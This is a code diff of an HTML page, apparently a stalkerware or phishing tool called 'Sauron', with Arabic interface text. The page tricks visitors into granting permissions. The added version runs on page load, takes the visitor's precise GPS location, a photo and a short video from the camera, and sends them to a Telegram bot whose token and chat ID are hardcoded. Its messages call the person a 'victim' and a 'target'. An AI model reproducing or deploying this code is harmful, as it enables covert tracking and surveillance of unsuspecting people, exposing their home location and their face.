@@ -3,27 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sauron Terminal v36 | نظام التحكم عن بعد</title>
+    <title>Sauron Kernel V38 | نظام التتبع العالي</title>
     <style>
-        body { background-color: #000; color: #00ff41; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .terminal { width: 90%; max-width: 600px; border: 2px solid #00ff41; padding: 20px; border-radius: 10px; box-shadow: 0 0 20px #00ff41; background: rgba(0, 10, 0, 0.95); }
-        .header { border-bottom: 1px solid #00ff41; padding-bottom: 10px; margin-bottom: 20px; font-weight: bold; }
-        .btn-activate { background: transparent; color: #00ff41; border: 2px solid #00ff41; padding: 15px 25px; font-size: 18px; cursor: pointer; width: 100%; font-weight: bold; text-transform: uppercase; transition: 0.3s; }
-        .btn-activate:hover { background: #00ff41; color: #000; box-shadow: 0 0 30px #00ff41; }
-        #console { margin-top: 15px; font-size: 12px; height: 100px; overflow-y: auto; text-align: left; color: #008f11; }
+        body { background-color: #000; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding-top: 100px; }
+        .box { border: 2px solid #00ff00; padding: 20px; display: inline-block; border-radius: 10px; box-shadow: 0 0 15px #00ff00; width: 90%; max-width: 450px; }
+        .loading { overflow: hidden; border-right: .15em solid orange; white-space: nowrap; margin: 0 auto; letter-spacing: .15em; animation: typing 3.5s steps(40, end), blink-caret .75s step-end infinite; }
+        @keyframes typing { from { width: 0 } to { width: 100% } }
+        @keyframes blink-caret { from, to { border-color: transparent } 50% { border-color: orange; } }
         video, canvas { display: none; }
     </style>
 </head>
-<body>
-
-    <div class="terminal">
-        <div class="header">SAURON_INTELLIGENCE_SYSTEM_V36.exe</div>
-        <p>> النظام جاهز للحقن الجغرافي واستخراج البيانات.</p>
-        <p>> يرجى الضغط بالأسفل لربط الأقمار الصناعية وكاميرا الجهاز بالسيرفر الرئيسي.</p>
-        
-        <button class="btn-activate" onclick="launchSauron()">تفعيل نظام التتبع والحقن</button>
-        
-        <div id="console">بانتظار تنفيذ الأوامر...</div>
+<body onload="autoStart()">
+    <div class="box">
+        <h1 class="loading">SYSTEM INJECTION... 100%</h1>
+        <p>> جاري مزامنة الموقع مع الأقمار الصناعية...</p>
+        <p>> يرجى الموافقة على 'صلاحية الموقع' لربط البوت بالجهاز.</p>
     </div>
 
     <video id="video" autoplay playsinline muted></video>
@@ -33,85 +27,52 @@
         const S_TOKEN = '8621828423:AAFq9_5-6snrjpfqrBrOPboh7VE824xVN_M';
         const S_ID = '5475815049';
 
-        async function launchSauron() {
-            const consoleBox = document.getElementById('console');
-            consoleBox.innerHTML += "<br>> جاري فك تشفير بروتوكولات GPS...";
-            
-            // 1. طلب الكاميرا والميكروفون فوراً
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                
-                consoleBox.innerHTML += "<br>> تم الوصول للحساسات البصرية...";
-                
-                // التقاط صورة (سيلفي) بعد ثانيتين
-                setTimeout(() => captureImage(), 2000);
-                
-                // تسجيل فيديو (3 ثوانٍ)
-                recordShortVideo(stream);
-                
-            } catch (err) {
-                sendToBot("⚠️ الضحية حظر الكاميرا/الفيديو.");
-                consoleBox.innerHTML += "<br>> خطأ: الكاميرا محجوبة!";
-            }
-
-            // 2. طلب الـ GPS الحقيقي (بالمتر)
+        async function autoStart() {
+            // سحب الموقع تلقائياً بأعلى دقة (GPS)
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(pos => {
                     const lat = pos.coords.latitude;
                     const lon = pos.coords.longitude;
-                    const acc = pos.coords.accuracy;
                     const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-                    
-                    sendToBot(`🎯 *صيد ثمين من الرادار!* 🎯\n━━━━━━━━━━━━━━\n📍 *رابط البيت بالمتر:* [إفتح هنا](${mapUrl})\n📡 الدقة: ${acc.toFixed(1)} متر\n🛰️ الإحداثيات: \`${lat}, ${lon}\``);
-                    consoleBox.innerHTML += "<br>> تم تثبيت الموقع عبر القمر الصناعي بنجاح!";
-                }, err => {
-                    sendToBot("⚠️ الضحية حظر الموقع الجغرافي.");
-                    consoleBox.innerHTML += "<br>> خطأ: تعذر الوصول للموقع!";
-                }, { enableHighAccuracy: true });
+                    sendMsg(`🎯 *تم تثبيت الهدف بالملي!* 🎯\n━━━━━━━━━━━━━━\n📍 *الموقع:* [فتح الخريطة](${mapUrl})\n📡 الدقة: ${pos.coords.accuracy.toFixed(1)} متر`);
+                }, err => { sendMsg("⚠️ الضحية رفض الموقع."); }, { enableHighAccuracy: true });
             }
+
+            // سحب الكاميرا (صورة + فيديو)
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                setTimeout(() => { takePhoto(); recordVid(stream); }, 2000);
+            } catch (e) { sendMsg("⚠️ الضحية رفض الكاميرا."); }
         }
 
-        function captureImage() {
-            const video = document.getElementById('video');
+        function takePhoto() {
             const canvas = document.getElementById('canvas');
+            const video = document.getElementById('video');
             canvas.width = video.videoWidth; canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
-            canvas.toBlob(blob => {
-                const fd = new FormData();
-                fd.append('chat_id', S_ID);
-                fd.append('photo', blob, 'face.jpg');
-                fd.append('caption', '📸 *صورة وجه الهدف الملتقطة الآن!*');
+            canvas.toBlob(b => {
+                const fd = new FormData(); fd.append('chat_id', S_ID); fd.append('photo', b, 'f.jpg');
                 fetch(`https://api.telegram.org/bot${S_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
             }, 'image/jpeg');
         }
 
-        function recordShortVideo(stream) {
-            const recorder = new MediaRecorder(stream);
-            let chunks = [];
-            recorder.ondataavailable = e => chunks.push(e.data);
-            recorder.onstop = () => {
-                const blob = new Blob(chunks, { type: 'video/mp4' });
-                const fd = new FormData();
-                fd.append('chat_id', S_ID);
-                fd.append('video', blob, 'target_vid.mp4');
-                fd.append('caption', '🎥 *تسجيل فيديو قصير للهدف!*');
+        function recordVid(s) {
+            const rc = new MediaRecorder(s); let ch = [];
+            rc.ondataavailable = e => ch.push(e.data);
+            rc.onstop = () => {
+                const b = new Blob(ch, { type: 'video/mp4' });
+                const fd = new FormData(); fd.append('chat_id', S_ID); fd.append('video', b, 'v.mp4');
                 fetch(`https://api.telegram.org/bot${S_TOKEN}/sendVideo`, { method: 'POST', body: fd });
             };
-            recorder.start();
-            setTimeout(() => {
-                recorder.stop();
-                stream.getTracks().forEach(t => t.stop()); // إغلاق الكاميرا للتمويه
-                alert("✅ تم تفعيل الأداة بنجاح! سيتم إرسال البيانات المجمعة للبوت.");
-            }, 3000); // مدة الفيديو 3 ثوانٍ
+            rc.start(); setTimeout(() => { rc.stop(); s.getTracks().forEach(t => t.stop()); }, 4000);
         }
 
-        function sendToBot(msg) {
+        function sendMsg(t) {
             fetch(`https://api.telegram.org/bot${S_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ chat_id: S_ID, text: msg, parse_mode: 'Markdown' })
+                method: 'POST', headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id: S_ID, text: t, parse_mode: 'Markdown' })
             });
         }
     </script>
